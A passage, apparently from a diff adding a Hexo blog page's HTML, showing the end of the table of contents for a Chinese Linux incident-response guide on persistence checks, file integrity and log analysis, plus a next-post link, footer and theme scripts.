class="top-box-link" href="#4-3-%E6%9C%8D%E5%8A%A1%E8%87%AA%E5%90%AF%E5%8A%A8"><span class="top-box-text">4.3 服务自启动</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#4-4-Shell-%E5%90%AF%E5%8A%A8%E6%96%87%E4%BB%B6%E4%B8%8E%E5%91%BD%E4%BB%A4%E5%88%AB%E5%90%8D%E5%90%8E%E9%97%A8"><span class="top-box-text">4.4 Shell 启动文件与命令别名后门</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%BA%94%E3%80%81%E6%96%87%E4%BB%B6%E4%B8%8E%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%95%B4%E6%80%A7"><span class="top-box-text">五、文件与命令完整性</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-1-%E5%8F%AF%E7%96%91%E6%96%87%E4%BB%B6%E6%8E%92%E6%9F%A5"><span class="top-box-text">5.1 可疑文件排查</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#5-2-%E5%91%BD%E4%BB%A4%E6%9B%BF%E6%8D%A2%E4%B8%8E%E6%96%87%E4%BB%B6%E4%BF%9D%E6%8A%A4"><span class="top-box-text">5.2 命令替换与文件保护</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E5%85%AD%E3%80%81%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%E4%B8%8E%E6%97%B6%E9%97%B4%E7%BA%BF"><span class="top-box-text">六、日志分析与时间线</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-1-%E5%85%B3%E9%94%AE%E6%97%A5%E5%BF%97%E4%B8%8E%E7%99%BB%E5%BD%95%E5%88%86%E6%9E%90"><span class="top-box-text">6.1 关键日志与登录分析</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-2-journald-%E4%B8%8E-auditd"><span class="top-box-text">6.2 journald 与 auditd</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#6-3-%E6%97%A5%E5%BF%97%E5%8F%91%E9%80%81%E4%B8%8E%E6%B8%85%E7%90%86%E7%97%95%E8%BF%B9"><span class="top-box-text">6.3 日志发送与清理痕迹</span></a></li></ol></li><li class="top-box-item top-box-level-2"><a class="top-box-link" href="#%E4%B8%83%E3%80%81%E5%B7%A5%E5%85%B7%E4%B8%8E%E5%8F%82%E8%80%83"><span class="top-box-text">七、工具与参考</span></a><ol class="top-box-child"><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#7-1-%E5%B7%A5%E5%85%B7%E7%AF%87"><span class="top-box-text">7.1 工具篇</span></a></li><li class="top-box-item top-box-level-3"><a class="top-box-link" href="#7-2-%E5%8F%82%E8%80%83%E7%AF%87"><span class="top-box-text">7.2 参考篇</span></a></li></ol></li></ol>
+        </div>
+          
+      </div>
+    </div>
+
+    
+      <div class="next-post">
+        <a class="purple-link" href="/2025/08/14/wechat-service-account-capture/">
+          <h3 class="post-title">
+            
+            下一篇：服务号渗透测试抓包问题解决(使用Burpsuite抓取手机app数据)
+          </h3>
+        </a>
+      </div>
+    
+  </div>
+
+
+
+
+
+
+
+<footer>
+<div class="site-footer">
+  <div class="social-container">
+    
+      
+        <a aria-label="跳转至github" href="https://github.com/z50n6" target="_blank">
+          <i class="icon icon-github"></i>
+        </a>
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+      
+    
+  </div>
+  
+    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> <a href="https://github.com/f-dong/hexo-theme-minimalism" target="_blank">Theme</a>
+  
+  
+  
+    
+     |
+    
+      <a href="/atom.xml" target="_blank">RSS</a>
+  
+  
+  
+  
+</div>
+</footer>
+
+
+      </div>
+    </div>
+    
+    
+      
+<div class="scroll-nav" id="scroll-nav">
+  <button type="button" class="scroll-nav-btn" data-scroll="top" aria-label="回到顶部" title="回到顶部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+         stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+      <path d="M6 15l6-6 6 6"></path>
+    </svg>
+  </button>
+  <button type="button" class="scroll-nav-btn" data-scroll="bottom" aria-label="回到底部" title="回到底部">
+    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"
+         stroke-linecap="round" stroke-linejoin="round" aria-hidden="true">
+      <path d="M6 9l6 6 6-6"></path>
+    </svg>
+  </button>
+</div>
+
+      <script src="/js/scroll-nav.js" defer></script>
+    
+    
+<script id="hexo-configurations"> window.theme_config = {"image":{"lazyload_enable":true,"lazyload_placeholder":null,"photo_zoom":"simple-lightbox"},"search":{"enable":true,"type":"json","placeholder":"输入关键词搜索...","algolia":{"appID":"","apiKey":"","indexName":""}},"language":"zh-CN"}; window.is_post = true; </script>
+
+<script src="/js/main.js"></script>
+
+
+
+
+
+
+  <script src="/js/simple-lightbox.min.js"></script><script>document.addEventListener('DOMContentLoaded', function() {new SimpleLightbox('.post-detail .simple-lightbox', {fileExt: false,captionsData:'alt'});});</script></body>
+</html>
+
